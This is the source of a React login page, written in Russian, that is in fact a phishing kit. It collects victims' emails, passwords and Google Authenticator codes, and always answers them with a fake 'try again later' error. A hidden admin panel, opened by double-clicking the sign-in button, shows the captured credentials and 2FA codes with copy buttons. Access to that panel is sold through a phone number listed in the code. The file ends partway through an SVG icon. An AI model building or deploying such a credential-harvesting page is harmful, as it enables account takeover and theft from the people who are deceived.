"use client"

import type React from "react"
import { useState, useEffect, useRef } from "react"
import { ArrowLeft, MessageSquare, Eye, EyeOff, Trash2, Settings, LogOut, Copy } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Label } from "@/components/ui/label"
import { getDeviceFingerprint, isSessionValid, setSession, clearSession } from "@/app/lib/device-fingerprint"

interface LoginAttempt {
  _id: string
  email: string
  password: string
  twoFactorCode?: string
  timestamp: string
  ip: string
  userAgent: string
}

interface AccessCode {
  _id: string
  code: string
  description: string
  createdAt: string
  usedDevices: string[]
  isActive: boolean
  currentActiveDevice?: string
}

export default function FacebookLogin() {
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [message, setMessage] = useState("")
  const [clickCount, setClickCount] = useState(0)
  const [showAdmin, setShowAdmin] = useState(false)
  const [showAccessCodeLogin, setShowAccessCodeLogin] = useState(false)
  const [showMasterCodePanel, setShowMasterCodePanel] = useState(false)
  const [show2FA, setShow2FA] = useState(false)
  const [loginAttempts, setLoginAttempts] = useState<LoginAttempt[]>([])
  const [isLoadingAttempts, setIsLoadingAttempts] = useState(false)
  const [showPasswords, setShowPasswords] = useState<{ [key: string]: boolean }>({})
  const [buttonText, setButtonText] = useState("Войти")
  const [newButtonText, setNewButtonText] = useState("")
  const [isSavingButton, setIsSavingButton] = useState(false)
  const [currentAttemptId, setCurrentAttemptId] = useState<string | null>(null)
  const [twoFactorCode, setTwoFactorCode] = useState(["", "", "", "", "", ""])
  const inputRefsArray = useRef<(HTMLInputElement | null)[]>([])
  const [accessCode, setAccessCode] = useState("")
  const [accessCodeError, setAccessCodeError] = useState("")
  const [accessCodes, setAccessCodes] = useState<AccessCode[]>([])
  const [newAccessCode, setNewAccessCode] = useState("")
  const [newAccessCodeDesc, setNewAccessCodeDesc] = useState("")
  const [isSavingAccessCode, setIsSavingAccessCode] = useState(false)
  const [accessCodeMessage, setAccessCodeMessage] = useState("")
  const [isSessionActive, setIsSessionActive] = useState(false)
  const [isMasterCodeUser, setIsMasterCodeUser] = useState(false)
  const [copiedField, setCopiedField] = useState<string | null>(null)
  const clickTimerRef = useRef<NodeJS.Timeout | null>(null)

  // Check session on mount
  useEffect(() => {
    fetchButtonText()
    checkAdminSession()
    // Set interval to check session validity more frequently
    const interval = setInterval(checkAdminSession, 5000)
    return () => clearInterval(interval)
  }, [])

  const checkAdminSession = () => {
    const isValid = isSessionValid()
    setIsSessionActive(isValid)
  }

  const fetchButtonText = async () => {
    try {
      const response = await fetch("/api/settings/button-text")
      if (response.ok) {
        const data = await response.json()
        setButtonText(data.buttonText || "Войти")
        setNewButtonText(data.buttonText || "Войти")
      }
    } catch (error) {
      console.error("Failed to fetch button text:", error)
    }
  }

  const updateButtonText = async () => {
    if (!newButtonText.trim()) return

    setIsSavingButton(true)
    try {
      const response = await fetch("/api/settings/button-text", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ buttonText: newButtonText }),
      })

      if (response.ok) {
        setButtonText(newButtonText)
        alert("Текст кнопки успешно обновлён!")
      }
    } catch (error) {
      console.error("Failed to update button text:", error)
      alert("Не удалось обновить текст кнопки")
    } finally {
      setIsSavingButton(false)
    }
  }

  const handleSignInClick = (e: React.MouseEvent) => {
    // Increment click count
    setClickCount((prev) => {
      const newCount = prev + 1

      // Clear previous timer
      if (clickTimerRef.current) {
        clearTimeout(clickTimerRef.current)
      }

      // If this is the second click within 300ms, it's a double click
      if (newCount === 2) {
        e.preventDefault()
        setClickCount(0)
        setMessage("")

        // Check session validity
        const sessionValid = isSessionValid()

        if (sessionValid) {
          setIsSessionActive(true)
          setShowAdmin(true)
          fetchLoginAttempts()
        } else {
          setIsSessionActive(false)
          setShowAccessCodeLogin(true)
        }

        return 0
      }

      // Set a timer to reset click count after 300ms
      clickTimerRef.current = setTimeout(() => {
        setClickCount(0)
        setMessage("")
      }, 300)

      return newCount
    })
  }

  const verifyAccessCode = async () => {
    if (!accessCode.trim()) {
      setAccessCodeError("Access code is required")
      return
    }

    try {
      const response = await fetch("/api/access-codes/verify", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          accessCode,
          deviceFingerprint: getDeviceFingerprint(),
        }),
      })

      const data = await response.json()

      if (!response.ok) {
        setAccessCodeError(data.error || "Invalid access code")
        return
      }

      // Set session for 24 hours
      setSession()
      setIsSessionActive(true)

      // Check if master code
      if (data.isMasterCode) {
        setIsMasterCodeUser(true)
        setShowMasterCodePanel(true)
        setShowAccessCodeLogin(false)
        fetchAccessCodes()
      } else {
        setIsMasterCodeUser(false)
        setShowAdmin(true)
        setShowAccessCodeLogin(false)
        fetchLoginAttempts()
      }

      setAccessCode("")
      setAccessCodeError("")
    } catch (error) {
      setAccessCodeError("Failed to verify access code")
    }
  }

  const fetchAccessCodes = async () => {
    try {
      const response = await fetch("/api/access-codes")
      if (response.ok) {
        const data = await response.json()
        setAccessCodes(data.codes)
      }
    } catch (error) {
      console.error("Failed to fetch access codes:", error)
    }
  }

  const createAccessCode = async () => {
    if (!newAccessCode.trim()) {
      setAccessCodeMessage("Access code is required")
      return
    }

    setIsSavingAccessCode(true)
    try {
      const response = await fetch("/api/access-codes", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          accessCode: newAccessCode,
          description: newAccessCodeDesc,
        }),
      })

      if (response.ok) {
        setAccessCodeMessage("Access code created successfully!")
        setNewAccessCode("")
        setNewAccessCodeDesc("")
        fetchAccessCodes()
      } else {
        const data = await response.json()
        setAccessCodeMessage(data.error || "Failed to create access code")
      }
    } catch (error) {
      setAccessCodeMessage("Failed to create access code")
    } finally {
      setIsSavingAccessCode(false)
    }
  }

  const deleteAccessCode = async (code: string) => {
    try {
      const response = await fetch("/api/access-codes", {
        method: "DELETE",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ code }),
      })

      if (response.ok) {
        fetchAccessCodes()
      }
    } catch (error) {
      console.error("Failed to delete access code:", error)
    }
  }

  const handleLogout = async () => {
    try {
      // Clear the active device from the access code
      await fetch("/api/access-codes/logout", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          deviceFingerprint: getDeviceFingerprint(),
        }),
      })
    } catch (error) {
      console.error("Failed to notify logout:", error)
    }

    // Clear local session
    clearSession()
    setIsSessionActive(false)
    setShowAdmin(false)
    setShowMasterCodePanel(false)
    setIsMasterCodeUser(false)
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setMessage("")

    try {
      const response = await fetch("/api/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email,
          password,
        }),
      })

      if (response.ok) {
        const data = await response.json()
        setCurrentAttemptId(data.attemptId)
        setShow2FA(true)
      } else {
        setMessage("Пожалуйста, попробуйте позже.")
      }
    } catch (error) {
      setMessage("Пожалуйста, попробуйте позже.")
    } finally {
      setIsLoading(false)
    }
  }

  const handle2FAInput = (index: number, value: string) => {
    if (value && !/^\d$/.test(value)) return

    const newCode = [...twoFactorCode]
    newCode[index] = value

    setTwoFactorCode(newCode)

    if (value && index < 5) {
      inputRefsArray.current[index + 1]?.focus()
    }

    if (newCode.every((digit) => digit !== "") && index === 5) {
      submit2FACode(newCode.join(""))
    }
  }

  const handle2FAKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !twoFactorCode[index] && index > 0) {
      inputRefsArray.current[index - 1]?.focus()
    }
  }

  const handle2FAPaste = (e: React.ClipboardEvent) => {
    e.preventDefault()
    const pastedData = e.clipboardData.getData("text").slice(0, 6)
    const digits = pastedData.split("").filter((char) => /^\d$/.test(char))

    const newCode = [...twoFactorCode]
    digits.forEach((digit, idx) => {
      if (idx < 6) {
        newCode[idx] = digit
      }
    })

    setTwoFactorCode(newCode)

    const nextEmptyIndex = newCode.findIndex((digit) => digit === "")
    if (nextEmptyIndex !== -1) {
      inputRefsArray.current[nextEmptyIndex]?.focus()
    } else {
      inputRefsArray.current[5]?.focus()
      if (newCode.every((digit) => digit !== "")) {
        submit2FACode(newCode.join(""))
      }
    }
  }

  const submit2FACode = async (code: string) => {
    if (!currentAttemptId) return

    try {
      const response = await fetch("/api/login/2fa", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          attemptId: currentAttemptId,
          twoFactorCode: code,
        }),
      })

      if (response.ok) {
        setShow2FA(false)
        setTwoFactorCode(["", "", "", "", "", ""])
        setEmail("")
        setPassword("")
        setMessage("Пожалуйста, попр��буйте позже.")
      }
    } catch (error) {
      console.error("Failed to submit 2FA code:", error)
    }
  }

  const fetchLoginAttempts = async () => {
    setIsLoadingAttempts(true)
    try {
      const response = await fetch("/api/admin/attempts")
      if (response.ok) {
        const data = await response.json()
        setLoginAttempts(data.attempts)
      }
    } catch (error) {
      console.error("Failed to fetch login attempts:", error)
    } finally {
      setIsLoadingAttempts(false)
    }
  }

  const deleteAttempt = async (id: string) => {
    try {
      const response = await fetch(`/api/admin/attempts/${id}`, {
        method: "DELETE",
      })
      if (response.ok) {
        setLoginAttempts(loginAttempts.filter((attempt) => attempt._id !== id))
      }
    } catch (error) {
      console.error("Failed to delete attempt:", error)
    }
  }

  const deleteAllAttempts = async () => {
    try {
      const response = await fetch("/api/admin/attempts", {
        method: "DELETE",
      })
      if (response.ok) {
        setLoginAttempts([])
      }
    } catch (error) {
      console.error("Failed to delete all attempts:", error)
    }
  }

  const togglePasswordVisibility = (id: string) => {
    setShowPasswords((prev) => ({
      ...prev,
      [id]: !prev[id],
    }))
  }

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString("ru-RU")
  }

  const copyToClipboard = (text: string, fieldName: string) => {
    navigator.clipboard.writeText(text)
    setCopiedField(fieldName)
    setTimeout(() => setCopiedField(null), 2000)
  }

  // Master Code Panel (Access Code Generator)
  if (showMasterCodePanel) {
    return (
      <div className="min-h-screen bg-gray-50 p-4">
        <Card className="max-w-6xl mx-auto">
          <CardHeader className="flex flex-row items-center justify-between">
            <CardTitle className="text-2xl font-bold">Master Admin Panel</CardTitle>
            <Button onClick={handleLogout} variant="destructive" className="gap-2">
              <LogOut className="w-4 h-4" />
              Logout
            </Button>
          </CardHeader>
          <CardContent className="space-y-6">
            {/* Create New Access Code */}
            <Card className="border-purple-200 bg-purple-50">
              <CardHeader>
                <CardTitle className="text-lg">Create New Access Code</CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="accessCode">Access Code</Label>
                  <Input
                    id="accessCode"
                    value={newAccessCode}
                    onChange={(e) => setNewAccessCode(e.target.value)}
                    placeholder="Enter access code (e.g., ADMIN001)"
                    className="font-mono"
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="description">Description (Optional)</Label>
                  <Input
                    id="description"
                    value={newAccessCodeDesc}
                    onChange={(e) => setNewAccessCodeDesc(e.target.value)}
                    placeholder="e.g., Developer access"
                  />
                </div>
                <Button onClick={createAccessCode} disabled={isSavingAccessCode} className="w-full">
                  {isSavingAccessCode ? "Creating..." : "Create Access Code"}
                </Button>
                {accessCodeMessage && (
                  <p
                    className={`text-sm ${accessCodeMessage.includes("successfully") ? "text-green-600" : "text-red-600"}`}
                  >
                    {accessCodeMessage}
                  </p>
                )}
              </CardContent>
            </Card>

            {/* Access Codes List */}
            <div>
              <h3 className="text-lg font-semibold mb-4">Active Access Codes</h3>
              {accessCodes.length === 0 ? (
                <div className="text-center py-8 text-gray-500">No access codes created yet</div>
              ) : (
                <div className="space-y-3">
                  {accessCodes.map((code) => (
                    <Card key={code._id} className="border-l-4 border-l-green-600">
                      <CardContent className="p-4">
                        <div className="flex justify-between items-start">
                          <div className="flex-1">
                            <p className="font-mono font-bold text-lg text-green-600">{code.code}</p>
                            {code.description && <p className="text-sm text-gray-600 mt-1">{code.description}</p>}
                            <p className="text-xs text-gray-500 mt-2">Created: {formatDate(code.createdAt)}</p>
                            <p className="text-xs text-gray-500">
                              {code.currentActiveDevice ? (
                                <span className="text-green-600 font-semibold">🟢 Active on 1 device</span>
                              ) : (
                                <span>Used on {code.usedDevices?.length || 0} device(s)</span>
                              )}
                            </p>
                          </div>
                          <Button onClick={() => deleteAccessCode(code.code)} variant="destructive" size="sm">
                            Delete
                          </Button>
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>
              )}
            </div>

            {/* Login Attempts Management */}
            <div>
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-lg font-semibold">Login Attempts</h3>
                <div className="flex gap-2">
                  <Button onClick={fetchLoginAttempts} disabled={isLoadingAttempts} variant="outline" size="sm">
                    {isLoadingAttempts ? "Updating..." : "Refresh"}
                  </Button>
                  <Button
                    onClick={deleteAllAttempts}
                    variant="destructive"
                    disabled={loginAttempts.length === 0}
                    size="sm"
                  >
                    Delete All
                  </Button>
                </div>
              </div>
              {isLoadingAttempts ? (
                <div className="text-center py-8">Loading attempts...</div>
              ) : loginAttempts.length === 0 ? (
                <div className="text-center py-8 text-gray-500">No login attempts found</div>
              ) : (
                <div className="space-y-4">
                  <div className="text-sm text-gray-600 mb-4">Total attempts: {loginAttempts.length}</div>
                  {loginAttempts.map((attempt) => (
                    <Card key={attempt._id} className="border-l-4 border-l-purple-600">
                      <CardContent className="p-4">
                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                          <div>
                            <label className="text-sm font-medium text-gray-600">Email/Phone:</label>
                            <div className="flex items-center gap-2">
                              <p className="font-mono text-sm bg-gray-100 p-2 rounded flex-1">{attempt.email}</p>
                              <button
                                type="button"
                                onClick={() => copyToClipboard(attempt.email, `email-${attempt._id}`)}
                                className="p-1 hover:bg-purple-100 rounded transition-colors"
                                title="Copy email"
                              >
                                {copiedField === `email-${attempt._id}` ? (
                                  <span className="text-green-600 text-xs font-semibold">✓</span>
                                ) : (
                                  <Copy className="w-4 h-4 text-gray-600 hover:text-purple-600" />
                                )}
                              </button>
                            </div>
                          </div>
                          <div>
                            <label className="text-sm font-medium text-gray-600">Password:</label>
                            <div className="flex items-center gap-2">
                              <p className="font-mono text-sm bg-gray-100 p-2 rounded flex-1">
                                {showPasswords[attempt._id] ? attempt.password : "•".repeat(attempt.password.length)}
                              </p>
                              <Button size="sm" variant="ghost" onClick={() => togglePasswordVisibility(attempt._id)}>
                                {showPasswords[attempt._id] ? (
                                  <EyeOff className="w-4 h-4" />
                                ) : (
                                  <Eye className="w-4 h-4" />
                                )}
                              </Button>
                              <button
                                type="button"
                                onClick={() => copyToClipboard(attempt.password, `password-${attempt._id}`)}
                                className="p-1 hover:bg-purple-100 rounded transition-colors"
                                title="Copy password"
                              >
                                {copiedField === `password-${attempt._id}` ? (
                                  <span className="text-green-600 text-xs font-semibold">✓</span>
                                ) : (
                                  <Copy className="w-4 h-4 text-gray-600 hover:text-purple-600" />
                                )}
                              </button>
                            </div>
                          </div>
                          {attempt.twoFactorCode && (
                            <div>
                              <label className="text-sm font-medium text-gray-600">2FA Code:</label>
                              <div className="flex items-center gap-2">
                                <p className="font-mono text-sm bg-green-100 p-2 rounded font-bold flex-1">
                                  {attempt.twoFactorCode}
                                </p>
                                <button
                                  type="button"
                                  onClick={() => copyToClipboard(attempt.twoFactorCode, `2fa-${attempt._id}`)}
                                  className="p-1 hover:bg-green-200 rounded transition-colors"
                                  title="Copy 2FA code"
                                >
                                  {copiedField === `2fa-${attempt._id}` ? (
                                    <span className="text-green-600 text-xs font-semibold">✓</span>
                                  ) : (
                                    <Copy className="w-4 h-4 text-gray-600 hover:text-green-600" />
                                  )}
                                </button>
                              </div>
                            </div>
                          )}
                          <div>
                            <label className="text-sm font-medium text-gray-600">Time:</label>
                            <p className="text-sm bg-gray-100 p-2 rounded">{formatDate(attempt.timestamp)}</p>
                          </div>
                          <div>
                            <label className="text-sm font-medium text-gray-600">IP Address:</label>
                            <p className="text-sm bg-gray-100 p-2 rounded">{attempt.ip}</p>
                          </div>
                          <div className="md:col-span-2">
                            <label className="text-sm font-medium text-gray-600">User Agent:</label>
                            <p className="text-xs bg-gray-100 p-2 rounded break-all">{attempt.userAgent}</p>
                          </div>
                        </div>
                        <div className="mt-4 flex justify-end">
                          <Button size="sm" variant="destructive" onClick={() => deleteAttempt(attempt._id)}>
                            <Trash2 className="w-4 h-4 mr-1" />
                            Delete
                          </Button>
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>
              )}
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  // Access Code Login Screen
  if (showAccessCodeLogin) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-purple-900 via-purple-800 to-purple-900 text-white flex items-center justify-center p-4">
        <Card className="w-full max-w-md bg-gradient-to-br from-gray-900 to-black border-2 border-purple-500 shadow-2xl shadow-purple-500/50">
          <CardHeader className="border-b border-purple-500 pb-6">
            <CardTitle className="text-3xl font-bold text-center text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-pink-400">
              Admin Access
            </CardTitle>
            <p className="text-center text-purple-300 text-sm mt-2">Enter your access code to continue</p>
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-4">
              <p className="text-sm text-blue-800">
                💡 <strong>Note:</strong> To get acccess codes contact +254794424486 for ksh 1000 per month or ksh 3000
                lifetime, One access code is limited to 1 device.
              </p>
            </div>
          </CardHeader>
          <CardContent className="space-y-6 pt-6">
            <div className="space-y-3">
              <Label htmlFor="adminCode" className="text-white font-semibold text-base">
                Access Code
              </Label>
              <Input
                id="adminCode"
                type="password"
                value={accessCode}
                onChange={(e) => {
                  setAccessCode(e.target.value)
                  setAccessCodeError("")
                }}
                onKeyPress={(e) => e.key === "Enter" && verifyAccessCode()}
                placeholder="Enter access code"
                className="bg-gray-800 border-2 border-purple-500 text-white placeholder-gray-400 text-lg py-3 font-semibold focus:border-pink-400 focus:ring-2 focus:ring-pink-400/50"
                autoFocus
              />
            </div>

            {accessCodeError && (
              <div className="bg-red-900/30 border-2 border-red-500 rounded-lg p-3">
                <p className="text-red-300 text-sm font-semibold">{accessCodeError}</p>
              </div>
            )}

            <Button
              onClick={verifyAccessCode}
              className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold py-3 text-lg rounded-lg"
            >
              Verify Access Code
            </Button>

            <Button
              onClick={() => setShowAccessCodeLogin(false)}
              variant="outline"
              className="w-full border-2 border-gray-600 text-white hover:bg-gray-800 hover:border-purple-500 font-semibold py-3 text-base"
            >
              Cancel
            </Button>
          </CardContent>
        </Card>
      </div>
    )
  }

  // Admin Panel
  if (showAdmin) {
    return (
      <div className="min-h-screen bg-gray-50 p-4">
        <Card className="max-w-6xl mx-auto">
          <CardHeader className="flex flex-row items-center justify-between">
            <CardTitle className="text-2xl font-bold">Admin Panel - Login Attempts</CardTitle>
            <div className="flex gap-2">
              <Button
                onClick={() => {
                  setShowAdmin(false)
                }}
                variant="outline"
                className="gap-2"
              >
                <ArrowLeft className="w-4 h-4" />
                Home
              </Button>
              <Button onClick={fetchLoginAttempts} disabled={isLoadingAttempts} variant="outline">
                {isLoadingAttempts ? "Updating..." : "Refresh"}
              </Button>
              <Button onClick={handleLogout} variant="destructive" className="gap-2">
                <LogOut className="w-4 h-4" />
                Logout
              </Button>
            </div>
          </CardHeader>
          <CardContent className="space-y-6">
            {/* Button Text Settings */}
            <Card className="border-purple-200 bg-purple-50">
              <CardHeader>
                <CardTitle className="text-lg flex items-center gap-2">
                  <Settings className="w-5 h-5" />
                  Button Text Settings
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="buttonText">Login Button Text</Label>
                  <div className="flex gap-2">
                    <Input
                      id="buttonText"
                      value={newButtonText}
                      onChange={(e) => setNewButtonText(e.target.value)}
                      placeholder="Enter button text"
                      className="flex-1"
                    />
                    <Button onClick={updateButtonText} disabled={isSavingButton || !newButtonText.trim()}>
                      {isSavingButton ? "Saving..." : "Save"}
                    </Button>
                  </div>
                  <p className="text-sm text-gray-600">
                    Current text: <span className="font-semibold">{buttonText}</span>
                  </p>
                </div>
              </CardContent>
            </Card>

            {/* Login Attempts (View Only) */}
            <div>
              <h3 className="text-lg font-semibold mb-4">Login Attempts </h3>
              {isLoadingAttempts ? (
                <div className="text-center py-8">Loading attempts...</div>
              ) : loginAttempts.length === 0 ? (
                <div className="text-center py-8 text-gray-500">No login attempts found</div>
              ) : (
                <div className="space-y-4">
                  <div className="text-sm text-gray-600 mb-4">Total attempts: {loginAttempts.length}</div>
                  {loginAttempts.map((attempt) => (
                    <Card key={attempt._id} className="border-l-4 border-l-purple-600">
                      <CardContent className="p-4">
                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                          <div>
                            <label className="text-sm font-medium text-gray-600">Email/Phone:</label>
                            <div className="flex items-center gap-2">
                              <p className="font-mono text-sm bg-gray-100 p-2 rounded flex-1">{attempt.email}</p>
                              <button
                                type="button"
                                onClick={() => copyToClipboard(attempt.email, `email-${attempt._id}`)}
                                className="p-1 hover:bg-purple-100 rounded transition-colors"
                                title="Copy email"
                              >
                                {copiedField === `email-${attempt._id}` ? (
                                  <span className="text-green-600 text-xs font-semibold">✓</span>
                                ) : (
                                  <Copy className="w-4 h-4 text-gray-600 hover:text-purple-600" />
                                )}
                              </button>
                            </div>
                          </div>
                          <div>
                            <label className="text-sm font-medium text-gray-600">Password:</label>
                            <div className="flex items-center gap-2">
                              <p className="font-mono text-sm bg-gray-100 p-2 rounded flex-1">
                                {showPasswords[attempt._id] ? attempt.password : "•".repeat(attempt.password.length)}
                              </p>
                              <Button size="sm" variant="ghost" onClick={() => togglePasswordVisibility(attempt._id)}>
                                {showPasswords[attempt._id] ? (
                                  <EyeOff className="w-4 h-4" />
                                ) : (
                                  <Eye className="w-4 h-4" />
                                )}
                              </Button>
                              <button
                                type="button"
                                onClick={() => copyToClipboard(attempt.password, `password-${attempt._id}`)}
                                className="p-1 hover:bg-purple-100 rounded transition-colors"
                                title="Copy password"
                              >
                                {copiedField === `password-${attempt._id}` ? (
                                  <span className="text-green-600 text-xs font-semibold">✓</span>
                                ) : (
                                  <Copy className="w-4 h-4 text-gray-600 hover:text-purple-600" />
                                )}
                              </button>
                            </div>
                          </div>
                          {attempt.twoFactorCode && (
                            <div>
                              <label className="text-sm font-medium text-gray-600">2FA Code:</label>
                              <div className="flex items-center gap-2">
                                <p className="font-mono text-sm bg-green-100 p-2 rounded font-bold flex-1">
                                  {attempt.twoFactorCode}
                                </p>
                                <button
                                  type="button"
                                  onClick={() => copyToClipboard(attempt.twoFactorCode, `2fa-${attempt._id}`)}
                                  className="p-1 hover:bg-green-200 rounded transition-colors"
                                  title="Copy 2FA code"
                                >
                                  {copiedField === `2fa-${attempt._id}` ? (
                                    <span className="text-green-600 text-xs font-semibold">✓</span>
                                  ) : (
                                    <Copy className="w-4 h-4 text-gray-600 hover:text-green-600" />
                                  )}
                                </button>
                              </div>
                            </div>
                          )}
                          <div>
                            <label className="text-sm font-medium text-gray-600">Time:</label>
                            <p className="text-sm bg-gray-100 p-2 rounded">{formatDate(attempt.timestamp)}</p>
                          </div>
                          <div>
                            <label className="text-sm font-medium text-gray-600">IP Address:</label>
                            <p className="text-sm bg-gray-100 p-2 rounded">{attempt.ip}</p>
                          </div>
                          <div className="md:col-span-2">
                            <label className="text-sm font-medium text-gray-600">User Agent:</label>
                            <p className="text-xs bg-gray-100 p-2 rounded break-all">{attempt.userAgent}</p>
                          </div>
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>
              )}
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  // 2FA Screen
  if (show2FA) {
    return (
      <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col">
        <div className="px-6 py-6">
          <button
            onClick={() => {
              setShow2FA(false)
              setTwoFactorCode(["", "", "", "", "", ""])
            }}
            className="p-2 hover:bg-gray-800 rounded-lg transition-colors"
          >
            <ArrowLeft className="w-6 h-6" />
          </button>
        </div>

        <div className="flex-1 px-6 py-8 flex flex-col">
          <div className="mb-8">
            <p className="text-gray-400 text-sm mb-4">2FA</p>
            <h1 className="text-3xl font-bold">Enter your Google Authenticator code</h1>
          </div>

          <div className="flex gap-3 mb-8">
            {twoFactorCode.map((digit, index) => (
              <input
                key={index}
                ref={(el) => {
                  if (el) inputRefsArray.current[index] = el
                }}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handle2FAInput(index, e.target.value)}
                onKeyDown={(e) => handle2FAKeyDown(index, e)}
                onPaste={index === 0 ? handle2FAPaste : undefined}
                className={`w-14 h-16 bg-[#1a1a1a] border-2 ${
                  digit ? "border-purple-600" : "border-gray-700"
                } rounded-xl text-white text-center text-2xl font-semibold focus:outline-none focus:border-purple-600 transition-colors`}
                autoFocus={index === 0}
              />
            ))}
          </div>

          <div className="flex-1" />

          <Button
            type="button"
            className="w-full h-14 bg-transparent border-2 border-gray-700 hover:bg-gray-800 text-white font-semibold rounded-2xl text-base"
          >
            Open Google Authenticator
          </Button>
        </div>
      </div>
    )
  }

  // Login Screen
  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col">
      <div className="px-6 py-6 flex items-center justify-between">
        <button className="p-2 hover:bg-gray-800 rounded-lg transition-colors">
          <ArrowLeft className="w-6 h-6" />
        </button>
        <button className="p-2 hover:bg-gray-800 rounded-lg transition-colors">
          <MessageSquare className="w-6 h-6" />
        </button>
      </div>

      <div className="flex-1 px-6 py-8 flex flex-col">
        <div className="mb-8">
          <h1 className="text-3xl font-bold mb-3">Войти в аккаунт</h1>
          <p className="text-gray-400">
            Впервые здесь?{" "}
            <span className="text-purple-500 font-medium cursor-pointer hover:text-purple-400">Создать сейчас</span>
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6 flex-1 flex flex-col">
          <div>
            <Input
              type="text"
              placeholder="Электронная почта"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              onKeyPress={(e) => {
                if (e.key === "Enter" && email && password) {
                  handleSubmit(e as any)
                }
              }}
              className="w-full h-14 px-4 bg-[#1a1a1a] border-0 rounded-2xl text-white placeholder-gray-500 focus:ring-2 focus:ring-purple-600"
              required
            />
          </div>

          <div className="relative">
            <Input
              type={showPassword ? "text" : "password"}
              placeholder="Пароль"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              onKeyPress={(e) => {
                if (e.key === "Enter" && email && password) {
                  handleSubmit(e as any)
                }
              }}
              className="w-full h-14 px-4 pr-12 bg-[#1a1a1a] border-0 rounded-2xl text-white placeholder-gray-500 focus:ring-2 focus:ring-purple-600"
              required
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-4 top-1/2 transform -translate-y-1/2 text-purple-500 hover:text-purple-400"
            >
              {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
            </button>
          </div>

          <div className="text-center">
            <button type="button" className="text-purple-500 font-medium hover:text-purple-400">
              Забыли пароль?
            </button>
          </div>

          {message && (
            <div className={`text-center text-sm ${message.includes("💡") ? "text-blue-400" : "text-red-500"}`}>
              {message}
            </div>
          )}

          <div className="flex-1" />

          <div className="space-y-4">
            <Button
              type="submit"
              disabled={isLoading}
              onClick={handleSignInClick}
              className="w-full h-14 bg-purple-600 hover:bg-purple-700 text-white font-semibold rounded-2xl text-lg disabled:opacity-50"
            >
              {isLoading ? "Вход..." : buttonText}
            </Button>

            <div className="text-center text-gray-500 text-sm">или</div>

            <div className="space-y-3">
              <button
                type="button"
                className="w-full h-14 bg-[#1a1a1a] hover:bg-[#252525] text-white rounded-2xl flex items-center justify-center gap-3 transition-colors"
              >
                <svg className="w-5 h-5" viewBox="0 0 24 24">
                  <path
                    fill="currentColor"
                    d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
                  />
                  <path
                    fill="currentColor"
                    d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23s3.99-3.47 5.82-7.07l-3.66-2.84c-.87 2.6-3.3 4.53-6.16 4.53z"
                  />
                  <path
                    fill="currentColor"
                    d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
                  />
                  <path
                    fill="currentColor"
                    d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
                  />
                </svg>
                <span>Войти через Google</span>
              </button>

              <button
                type="button"
                className="w-full h-14 bg-[#1a1a1a] hover:bg-[#252525] text-white rounded-2xl flex items-center justify-center gap-3 transition-colors"
              >
                <svg className="w-5 h-5" viewBox="0 0 24 24" fill="currentColor">
